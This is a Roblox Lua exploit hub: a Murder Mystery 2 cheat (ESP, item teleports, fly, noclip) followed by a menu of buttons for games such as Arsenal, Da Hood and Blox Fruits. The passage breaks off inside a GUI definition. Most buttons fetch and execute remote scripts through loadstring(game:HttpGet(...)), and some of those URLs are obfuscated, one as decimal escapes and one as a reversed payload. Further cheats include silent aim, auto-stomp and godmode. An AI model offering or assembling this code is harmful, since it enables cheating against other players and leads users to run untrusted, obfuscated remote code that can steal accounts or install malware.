    nikohead.AlwaysOnTop = true
    nikohead.LightInfluence = 1
    nikohead.Size = UDim2.new(1, 0, 1, 0)
    
    Frame.Parent = nikohead
    Frame.BackgroundColor3 = Color3.new(0,0,255);
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.Rotation = 120
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function checkTeam(plr)
    local bp = plr.Backpack
    local char = plr.Character

    local x = false;
    for i,v in pairs(char:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    for i,v in pairs(bp:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    if (bp:FindFirstChild("Knife") or char:FindFirstChild("Knife")) then
        return 1;
    elseif (x) then
        return 2;
    else
        return 3;
    end
end

pez:init();

enableds = {};

espon = false;
fovon = false;

espgun = false;
espmurderer = true;
espsheriff = true;
espinnocent = false;

tpgun = false;
tpcoins = false;

noclip = false;
fly = false;
fast = false;
highjump = false;

hidden = false;

showvisuals = true;
showespsettings = true;
showmovement = true;
showitems = true;
showenableds = true;
showplayerlist = true;

pez:addTab("cheats","Enabled cheats");

function toggleesp()
    espon = not espon;
    if (espon) then
        pez:addLabel("cheats","esp","ESP");
    else
        pez:removeLabel("cheats","esp");
    end
end

function togglefov()
    fovon = not fovon;
    if (fovon) then
        pez:addLabel("cheats","fov","FOV");
    else
        pez:removeLabel("cheats","fov");
    end
end

function toggleespgun()
    espgun = not espgun;
end

function toggleespmurderer()
    espmurderer = not espmurderer;
end

function toggleespsheriff()
    espsheriff = not espsheriff;
end

function toggleespinnocent()
    espinnocent = not espinnocent;
end

function toggletpgun()
    tpgun = not tpgun;
    if (tpgun) then
        pez:addLabel("cheats","tpgun","Tp gun");
    else
        pez:removeLabel("cheats","tpgun");
    end
end

function toggletpcoins()
    tpcoins = not tpcoins;
    if (tpcoins) then
        pez:addLabel("cheats","tpcoins","Tp coins");
    else
        pez:removeLabel("cheats","tpcoins");
    end
end

function togglenoclip()
    noclip = not noclip;
    if (noclip) then
        pez:addLabel("cheats","noclip","Noclip");
    else
        pez:removeLabel("cheats","noclip");
    end
end

function tplobby()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-107,149,23))
end

--FLY SCRIPT BY RGEENEUS

local speed = 50

local c
local h
local bv
local bav
local cam
local flying
local p = game.Players.LocalPlayer
local buttons = {W = false, S = false, A = false, D = false, Moving = false}

local startFly = function () -- Call this function to begin flying 
    if not p.Character or not p.Character.Head or flying then return end
    c = p.Character
    h = c.Humanoid
    h.PlatformStand = true
    cam = workspace:WaitForChild('Camera')
    bv = Instance.new("BodyVelocity")
    bav = Instance.new("BodyAngularVelocity")
    bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bv.Parent = c.Head
    bav.Parent = c.Head
    flying = true
    h.Died:connect(function() flying = false end)
end

local endFly = function () -- Call this function to stop flying
    if not p.Character or not flying then return end
    h.PlatformStand = false
    bv:Destroy()
    bav:Destroy()
    flying = false
end

game:GetService("UserInputService").InputBegan:connect(function (input, GPE) 
    if GPE then return end
    for i, e in pairs(buttons) do
        if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
            buttons[i] = true
            buttons.Moving = true
        end
    end
end)

game:GetService("UserInputService").InputEnded:connect(function (input, GPE) 
    if GPE then return end
    local a = false
    for i, e in pairs(buttons) do
        if i ~= "Moving" then
            if input.KeyCode == Enum.KeyCode[i] then
                buttons[i] = false
            end
            if buttons[i] then a = true end
        end
    end
    buttons.Moving = a
end)

local setVec = function (vec)
    return vec * (speed / vec.Magnitude)
end

game:GetService("RunService").Heartbeat:connect(function (step) -- The actual fly function, called every frame
    if flying and c and c.PrimaryPart then
        local p = c.PrimaryPart.Position
        local cf = cam.CFrame
        local ax, ay, az = cf:toEulerAnglesXYZ()
        c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
        if buttons.Moving then
            local t = Vector3.new()
            if buttons.W then t = t + (setVec(cf.lookVector)) end
            if buttons.S then t = t - (setVec(cf.lookVector)) end
            if buttons.A then t = t - (setVec(cf.rightVector)) end
            if buttons.D then t = t + (setVec(cf.rightVector)) end
            c:TranslateBy(t * step)
        end
    end
end)


function togglefly()
    if (fly) then
        fly = false;
        endFly()
        pez:removeLabel("cheats","fly");
    else
        fly = true;
        startFly()
        pez:addLabel("cheats","fly","Fly");
    end
end

function togglefast()
    fast = not fast;
    if (fast) then
        pez:addLabel("cheats","fast","Fast");
    else
        pez:removeLabel("cheats","fast");
    end
end

function togglejump()
    highjump = not highjump;
    if (highjump) then
        pez:addLabel("cheats","highjump","Highjump");
    else
        pez:removeLabel("cheats","highjump");
    end
end

function setday()
    local lighting = game.Lighting
    lighting.TimeOfDay = 12;
end

function setnight()
    local lighting = game.Lighting
    lighting.TimeOfDay = 22;
end

game:service'RunService'.Stepped:connect(function()
    if (noclip) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(11) end
    if (fast) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 24; else game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16; end
    if (highjump) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 120; else game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50; end
end)

function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.Home then
        if (hidden) then
            print(hidden)
            hidden = false;
            pez:show();
        else
            print(hidden)
            hidden = true;
            pez:hide();
        end
	end
end

function togglevisuals()
    if (showvisuals) then
        showvisuals = false;
        pez:hideTab("visuals");
    else
        showvisuals =true;
        pez:showTab("visuals");
    end
end

function toggleespsettings()
    if (showespsettings) then
        showespsettings = false;
        pez:hideTab("espsettings");
    else
        showespsettings =true;
        pez:showTab("espsettings");
    end
end

function toggleitems()
    if (showitems) then
        showitems = false;
        pez:hideTab("items");
    else
        showitems =true;
        pez:showTab("items");
    end
end

function togglemovement()
    if (showmovement) then
        showmovement = false;
        pez:hideTab("movement");
    else
        showmovement =true;
        pez:showTab("movement");
    end
end

function toggleenableds()
    if (showenableds) then
        showenableds = false;
        pez:hideTab("cheats");
    else
        showenableds =true;
        pez:showTab("cheats");
    end
end

function toggleplayerlist()
    if (showplayerlist) then
        showplayerlist = false;
        pez:hideTab("playerlist");
    else
        showplayerlist =true;
        pez:showTab("playerlist");
    end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

pez:addTab("gui","Gui");
pez:addLabel("gui","info","Toggle gui: Home")
pez:addButton("gui","Visuals",togglevisuals)
pez:addButton("gui","Esp settings",toggleespsettings)
pez:addButton("gui","Items",toggleitems)
pez:addButton("gui","Movement",togglemovement)
pez:addButton("gui","Enabled cheats",toggleenableds)
pez:addButton("gui","Playerlist",toggleplayerlist)

pez:addTab("visuals","Visuals");
pez:addButton("visuals","ESP",toggleesp)
pez:addButton("visuals","FOV",togglefov)
pez:addButton("visuals","Set night",setnight)
pez:addButton("visuals","Set day",setday)

pez:addTab("espsettings","Esp settings");
pez:addButton("espsettings","Show murderer",toggleespmurderer)
pez:addButton("espsettings","Show sheriff",toggleespsheriff)
pez:addButton("espsettings","Show innocents",toggleespinnocent)
pez:addButton("espsettings","Show dropped gun",toggleespgun);

pez:addTab("items","Items");
pez:addButton("items","Tp coins",toggletpcoins)
pez:addButton("items","Tp gun",toggletpgun)

pez:addTab("movement","Movement");
pez:addButton("movement","Noclip",togglenoclip)
pez:addButton("movement","Fly",togglefly)
pez:addButton("movement","Fast",togglefast)
pez:addButton("movement","Highjump",togglejump)
pez:addButton("movement","Tp to lobby",tplobby)

pez:addTab("playerlist","Playerlist")

pez:addTab("credits","Credits");
pez:addLabel("credits","nikoo","niko#1809")

print("press Home to toggle the gui");
print("mm2 script by niko#1809 / lekolar2 ;)")

local cor = coroutine.wrap(function()
    while(true) do
        wait(1)
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (pez:itemExists("playerlist",v.Name)) then
                    pez:removeLabel("playerlist",v.Name)
                end

                local team = checkTeam(v);

                if (team == 1) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(255,0,0))
                elseif (team == 2) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,0,255))
                else
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,255,0))
                end
            end
        end
    end
end)

cor();

x = 0;

while(true)do
    if (x == 200) then pez:removeTab("credits"); else x = x + 1; end
    wait();
    if (fovon) then
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 100;
    else
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 70;
    end
    if (tpcoins) then
        for i,v in pairs(workspace:GetChildren()) do
            if (v:FindFirstChild("CoinContainer")) then
                for w,g in pairs(v.CoinContainer:GetChildren()) do
                    g.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                end
            end
        end
    end
    if (tpgun) then
        if (workspace:FindFirstChild("GunDrop")) then
            workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        end
    end
    if (espon) then
        if (espgun) then
            if (workspace:FindFirstChild("GunDrop")) then
                if (workspace.GunDrop:FindFirstChild("nikohead")) then
                    workspace.GunDrop.nikohead:Destroy()
                end
                makedot(workspace.GunDrop);
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (v.Character:WaitForChild("HumanoidRootPart")) then
                    if (v~=game.Players.LocalPlayer) then
                        if (v.Character:WaitForChild("HumanoidRootPart"):FindFirstChild("yoniko")) then
                            v.Character:WaitForChild("HumanoidRootPart").yoniko:Destroy()
                        end
                        local team = checkTeam(v)

                        if (team == 1) then
                            if (espmurderer) then makebox(v.Character.HumanoidRootPart,Color3.new(255,0,0)); end
                        elseif (team == 2) then
                            if (espsheriff) then makebox(v.Character.HumanoidRootPart,Color3.new(0,0,255)); end
                        else
                            if (espinnocent) then makebox(v.Character.HumanoidRootPart,Color3.new(0,255,0)); end
                        end
                    end
                end
            end
        end
    end
end
end)

Section:NewButton("MM2 GUI 10 ", "This is new", function()
loadstring(game:HttpGet('https://pastebin.com/raw/DihfjHj2'))()
end)




local Section = Tab:NewSection("Tower Of Hell")
Section:NewButton("ToH Gui 1 ", "ButtonInfo", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/BloxiYT/85f97364b6367baac677e109488c9905/raw/c2972a2b892c4193509ddb2fe1ba3061435e1a8a/gistfile1.txt"))()
end)
Section:NewButton("ToH Gui 2 ", "ButtonInfo", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
end)
Section:NewButton("ToH Gui 3 ", "ButtonInfo", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
end)

Section:NewButton("ToH Admin ", "Its only admin command", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/nto/main/admiin"))()
end)

Section:NewButton("ToH GUI 1 ", "So Op for TOH", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/BbVHjH56'))()
end)

Section:NewButton("ToH Gui 2 ", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
end)

Section:NewButton("ToH Gui 3 ", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/TowerOfHell/main/README.md"))()
end)

Section:NewButton("ToH Gui 4 ", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/iiProductionz/Floater-Scripts/main/WaifuEdition/Tower%20Of%20Hell"))()
end)



local Section = Tab:NewSection("Arsenal")
Section:NewButton("Arsenal 1 ", "Arsenal", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/AdvanceTechV3.lua"))()
end)
Section:NewButton("Arsenal 2 ", "Arsenal", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)
Section:NewButton("Arsenal 3 ", "Arsenal", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
end)
Section:NewButton("Arsenal 4 ", "Arsenal", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/plutoguy/Tiger-Hub/main/loader.lua"))();
end)
Section:NewButton("Arsenal 5 ", "Arsenal", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)
Section:NewButton("Arsenal 6 ", "Arsenal", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
end)
Section:NewButton("Arsenal 7 ", "Arsenal", function()
_G.lockMeth = "Random" -- Change to head if you want your silent aim to ONLY aim at the head.
_G.silMeth = "FPORWIL" -- Silent Aim Method, You're gonna have to play around with it. The Default one is FindPartOnRayWithIgnoreList but shortened. 
_G.AntiFly = false -- Change if the game you're playing has an Anti-Fly, set it to false, if it has, set it to true, if it doesnt.
_G.Keystrokes = true -- If you want sexy keystrokes, turn it on.
_G.HideOverlay = false -- If you want the StormWare Watermark along with the features you've toggled shown, set it to true, not recommended for closet cheating, obviously.

local g = game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/lite/sw.lite.lua")
loadstring(g:reverse())()
task.wait(2)
if _G.HideOverlay == true then
    game.CoreGui["StormWare LITE"].modules.Visible = false
end
-- For some reason Synapse hates My keystrokes, so i have to set this manually. God fucking damn it.
game.CoreGui["StormWare LITE"].keystrokes.space.Text = "━━━━━"
end)
Section:NewButton("Arsenal 8 ", "Arsenal", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/F2B-HUB/F2B/main/HUB"))()
end)
Section:NewButton("Arsenal 9 ", "Arsenal", function()
loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/hook.lua"))()
end)

Section:NewButton("Arsenal 1 ", "Arsenal 2", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/xq7q0XPq"))()
end)

Section:NewButton("Arsenal 2 ", "Our script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/Arsenal"))()
end)

Section:NewButton("DexHub ", "Op and is Pc to", function()
-- please stop using this and just use the regular Arsenal file.

loadstring(game:HttpGet("https://raw.githubusercontent.com/HonestlyDex/DexHub/main/Arsenal"))()

local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local stop = Notification.new("info", "DexHub ☕", "This file will stop receiving updates soon!")
wait(0.5)
local stop2 = Notification.new("info", "DexHub ☕", "Please use the regular Arsenal file!")
end)



local Section = Tab:NewSection("Da Hood")
Section:NewButton("Da Hood GUI 1 ", "New GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
end)
Section:NewButton("Da Hood GUI 2 ", "New GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub"))()
end)
Section:NewButton("Da Hood GUI 3 ", "New GUI", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Au-code/Da-Hood-Doctor/main/ActualScript"))()
end)
Section:NewButton("Da Hood Script 4 ", "New GUI", function()
local rs = game:GetService("RunService")
local Players = game:GetService("Players")
if not Players.LocalPlayer then
  Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
end
local lp = Players.LocalPlayer
local connections = {}

local function getchar()
  return lp.Character or lp.CharacterAdded:Wait()
end

local MainEvent = game:GetService('ReplicatedStorage'):WaitForChild("MainEvent")

local state = false
local function initchar(char)
  local KO = char:WaitForChild("BodyEffects"):WaitForChild("KO")
  local Humanoid = char:WaitForChild("Humanoid")

  connections[Humanoid] = Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
     if KO.Value and Humanoid.Health >= 2 then
        if state then
           repeat task.wait() until not state
           if not KO.Value then return end
        end
        state = true
        local oldpos = getchar():WaitForChild("HumanoidRootPart").CFrame
        repeat
           if char then
              getchar():WaitForChild("HumanoidRootPart").CFrame = CFrame.new(char:WaitForChild("Head").CFrame.Position) * CFrame.new(0,3,0)
           end
           rs.Heartbeat:Wait()
           MainEvent:FireServer('Stomp')
        until not (Humanoid or Humanoid.Parent or KO.Value) or Humanoid.Health <= 2
        getchar():WaitForChild("HumanoidRootPart").CFrame = oldpos
        state = false
     end
  end)
end

local function initplayer(plr)
  if not connections[plr] then
     connections[plr] = plr.CharacterAdded:Connect(initchar)
  end
  local plrchar = plr.Character
  if plrchar then
     initchar(plrchar)
  end
end

connections["PlayerAdded"] = Players.PlayerAdded:Connect(initplayer)
connections["PlayerRemoving"] = Players.PlayerRemoving:Connect(function(plr)
  if connections[plr] then
     connections[plr]:Disconnect()
     connections[plr] = nil
  end
end)

for i,v in next, Players:GetPlayers() do
  if v ~= lp then
     initplayer(v)
  end
end

getgenv().toggle = function()
  for i,v in next, connections do
     v:Disconnect()
     print("Disconnecting",i,v)
  end
  getgenv().toggle = nil
end
end)

Section:NewButton("Da Hood GUI 1 ", "DA HOOD is kinda good", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/ZCiS8jSd'))()
end)

Section:NewButton("Da Hood GUI 2 ", "New GUI", function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/SoftVortex/.../main/....."),true))()
end)

Section:NewButton("Da Hood GUI 3 ", "Da Hood Evil", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/Da Hood"))()
end)

Section:NewButton("Da Hood GUI 4 ", "Da Hood Evil", function()
   loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\97\109\101\114\69\109\105\108\105\97\110\111\70\70\47\116\114\105\112\95\47\109\97\105\110\47\72\117\98\10",true))()
end)

Section:NewButton("Da Hood Gui 5 ", "Da Hood idk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/Da Hood"))()
end)

Section:NewButton("Da Hood GodMode (Old0", "You Will be god", function()
p = game.Players.LocalPlayer
ch = p.Character

ch.BodyEffects.Dead:Destroy()
end)

Section:NewButton("Da Hood Silent Aim ", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/Da Hood"))()
end)

Section:NewButton("Da Hood Gui 6 ", "So many scripts lol", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/Da Hood.Lua'))()
end)

Section:NewButton("Da Hood Gui 7 ", "Gay im jk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/UntitledhoodGui"))()
end)



local Section = Tab:NewSection("Blox Fruit")

Section:NewButton("Blox Fruits Gui 1 ", "Awesome", function()
loadstring(game:HttpGet("https://scriptdee.com/free/ZeeHubNew.lua"))()
end)

Section:NewButton("Blox Fruits Gui 2 ", "Awesome", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/REWzaKunGz1/premium/main/PadoHub'))()
end)

Section:NewButton("Blox Fruits Gui 3 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mei2232/ZaqueHub/main/Zaque%20Hub"))()
end)

Section:NewButton("Blox Fruits Gui 4 ", "Beep Boop", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
end)

Section:NewButton("Blox Fruits Gui 5 ", "Cool awesome", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/VoidHub/main/Script"))()
end)

Section:NewButton("Blox Fruits Gui 6 ", "Wassup lol", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/xDestinyx/RipperHub/main/Loader.lua'))()
end)

Section:NewButton("Blox Fruits Gui 7 ", "Noice Number 1", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Script%20Game"))()
end)

Section:NewButton("Blox Fruits Gui 8 ", "Noice Number 2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Fiend1sh/FiendMain/main/MadoxHubKey", true))()
end)

Section:NewButton("Blox Fruits Gui 9 ", "Noice Number 2", function()
loadstring(game:HttpGetAsync('https://sharetext.me/raw/u3if6m3hgr'))()
end)




local Section = Tab:NewSection("King Leagcy")
Section:NewButton("King Legacy Gui 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/StormSKz12/StirkeHub1/main/Gameincluded"))()
end)
Section:NewButton("King Legacy Gui 2 ", "", function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/KingLegacy.lua")()
end)
Section:NewButton("King Legacy Gui 3 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
end)

Section:NewButton("King Legacy Gui 1 ", "dont know who made it", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bearhub1/DolceHub/main/King-Legacy"))()
end)

Section:NewButton("King Legacy Gui 2 ", "", function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader")()
end)





local Section = Tab:NewSection("Anime Fighter")
Section:NewButton("AnimeFighter GUI 1 ", "AnimeFighter 1", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/M4tr1x01/luascripts/main/solohub.lua"))()
end)
Section:NewButton("AnimeFighter GUI 2 ", "AnimeFighter 2", function()
loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))();
end)
Section:NewButton("AnimeFighter GUI 3 ", "AnimeFighter 3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Shisobad/new/main/script.lua"))()
end)

Section:NewButton("AnimeFighter GUI 1 ", "AnimeFighter 1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/AFS/main/script.lua"))()
end)

Section:NewButton("AnimeFighter GUI 2 ", "cool", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
end)

Section:NewButton("AnimeFighter GUI 3 ", "Cool/Awesome", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader", true))()
end)

Section:NewButton("AnimeFighter GUI 4 ", "idk kinda old", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivyd/ShrawuRepost/main/Shrawu.lua", true))()
end)






local Section = Tab:NewSection("Ragdoll Engine (Deleted)")
Section:NewButton("Ragdoll Engine GUI 1 ", "", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/H20CalibreYT/731b5052013a54de121debdd5e43fa6d/raw/"))()
loadstring(game:HttpGet("https://gist.githubusercontent.com/H20CalibreYT/6f72becb21e7092b5eb107c337ee6fc9/raw/"))()
end)
Section:NewButton("Ragdoll Engine GUI 2 ", "", function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/TestingLua/Hubs/main/Ragdoll%20Engine.lua")()
end)

Section:NewButton("Ragdoll Engine GUI 1 ", "Gives you a OP gui", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua'))()
end)

Section:NewButton("Ragdoll Engine Gui 2 ", "Gives op Gui", function()
local Gui = Instance.new("ScreenGui")
local OpenFrame = Instance.new("Frame")
local OpenColorBar = Instance.new("Frame")
local Open = Instance.new("TextButton")
local MainFrame = Instance.new("Frame")
local MenuFrame = Instance.new("Frame")
local VipServer = Instance.new("TextButton")
local Back = Instance.new("TextButton")
local MainPage = Instance.new("TextButton")
local FunctionsPage = Instance.new("TextButton")
local TeleportsPage = Instance.new("TextButton")
local Exit = Instance.new("TextButton")
local Hide = Instance.new("TextButton")
local MainColorBar = Instance.new("Frame")
local MainContent = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")
local FunctionsContent = Instance.new("Frame")
local WalkSpeed = Instance.new("TextButton")
local JumpPower = Instance.new("TextButton")
local SpamTools = Instance.new("TextButton")
local Gravity = Instance.new("TextButton")
local KillPlayer = Instance.new("TextButton")
local TpToPlayer = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local AltDelete = Instance.new("TextButton")
local NoRagdoll = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local Victim = Instance.new("TextBox")
local TeleportsContent = Instance.new("Frame")
local TpSign = Instance.new("TextButton")
local TpEscalatorTop = Instance.new("TextButton")
local TpEscalatorBottom = Instance.new("TextButton")
local TpBuildingTop = Instance.new("TextButton")
local TpBuildingMiddle = Instance.new("TextButton")
local TpBuildingBin = Instance.new("TextButton")
local TpTempleStaircase = Instance.new("TextButton")
local TpSpiralStaircase = Instance.new("TextButton")
local TpEdge = Instance.new("TextButton")
local TpCannonRange = Instance.new("TextButton")
local TpPool = Instance.new("TextButton")
local TpBalloon = Instance.new("TextButton")
local speeding = true
local highjumping = true
local mooneffect = true
local phase = false
local visual = false
local P = game:GetService("Players").LocalPlayer.Character
local W = game:GetService("Workspace")
local deleting = false
local play = game:GetService("Players").LocalPlayer
local dollstopper = false
local spammer = false
Gui.Name = "Gui"
Gui.Parent = game.CoreGui
Gui.ResetOnSpawn = true
OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = Gui
OpenFrame.Active = true
OpenFrame.BackgroundColor3 = Color3.new(0, 0, 0)
OpenFrame.BackgroundTransparency = 0.30000001192093
OpenFrame.BorderColor3 = Color3.new(0, 0, 0)
OpenFrame.BorderSizePixel = 0
OpenFrame.Position = UDim2.new(0, 0, 0.5, 0)
OpenFrame.Size = UDim2.new(0, 196, 0, 48)
OpenFrame.Visible = false
OpenColorBar.Name = "OpenColorBar"
OpenColorBar.Parent = OpenFrame
OpenColorBar.Active = true
OpenColorBar.BackgroundColor3 = Color3.new(1, 0, 0)
OpenColorBar.BorderColor3 = Color3.new(0, 0, 0)
OpenColorBar.BorderSizePixel = 0
OpenColorBar.Position = UDim2.new(0.00510204071, 0, 0.9375, 0)
OpenColorBar.Size = UDim2.new(0, 195, 0, 3)
Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0, 0, 0)
Open.BackgroundTransparency = 1
Open.BorderColor3 = Color3.new(0, 0, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.00510204071, 0, 0, 0)
Open.Size = UDim2.new(0, 162, 0, 45)
Open.Font = Enum.Font.SourceSansLight
Open.Text = "Open"
Open.TextColor3 = Color3.new(1, 1, 1)
Open.TextSize = 32
MainFrame.Name = "MainFrame"
MainFrame.Parent = Gui
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BackgroundTransparency = 0.30000001192093
MainFrame.BorderColor3 = Color3.new(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Position = UDim2.new(0.328729272, 0, 0.36053133, 0)
MainFrame.Size = UDim2.new(0, 372, 0, 192)
MenuFrame.Name = "MenuFrame"
MenuFrame.Parent = MainFrame
MenuFrame.Active = true
MenuFrame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
MenuFrame.BorderColor3 = Color3.new(0, 0, 0)
MenuFrame.BorderSizePixel = 0
MenuFrame.Position = UDim2.new(-0.851999998, 0, 0, 0)
MenuFrame.Size = UDim2.new(0, 372, 0, 191)
MenuFrame.ZIndex = 2
VipServer.Name = "VipServer"
VipServer.Parent = MenuFrame
VipServer.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
VipServer.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
VipServer.Position = UDim2.new(0.0349462368, 0, 0.0942408368, 0)
VipServer.Size = UDim2.new(0, 95, 0, 33)
VipServer.ZIndex = 3
VipServer.Font = Enum.Font.SourceSansLight
VipServer.Text = "Vip Server"
VipServer.TextColor3 = Color3.new(1, 1, 1)
VipServer.TextSize = 22
Back.Name = "Back"
Back.Parent = MenuFrame
Back.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Back.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Back.Position = UDim2.new(0.327956975, 0, 0.0942408368, 0)
Back.Size = UDim2.new(0, 75, 0, 33)
Back.ZIndex = 3
Back.Font = Enum.Font.SourceSansLight
Back.Text = "<-- Back"
Back.TextColor3 = Color3.new(1, 1, 1)
Back.TextSize = 22
MainPage.Name = "MainPage"
MainPage.Parent = MenuFrame
MainPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
MainPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
MainPage.Position = UDim2.new(0.0349462368, 0, 0.314136118, 0)
MainPage.Size = UDim2.new(0, 301, 0, 33)
MainPage.ZIndex = 3
MainPage.Font = Enum.Font.SourceSansLight
MainPage.Text = "Main Page"
MainPage.TextColor3 = Color3.new(1, 1, 1)
MainPage.TextSize = 22
FunctionsPage.Name = "FunctionsPage"
FunctionsPage.Parent = MenuFrame
